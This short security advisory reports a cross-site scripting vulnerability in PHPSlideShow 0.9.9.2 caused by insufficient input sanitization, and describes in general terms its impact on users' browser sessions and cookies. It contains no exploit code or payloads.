PHPSlideShow is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.

Exploiting this issue allows attackers to execute arbitrary HTML or script code in a user's browser session in the context of an affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

This issue affects PHPSlideShow 0.9.9.2; other versions may also be vulnerable.
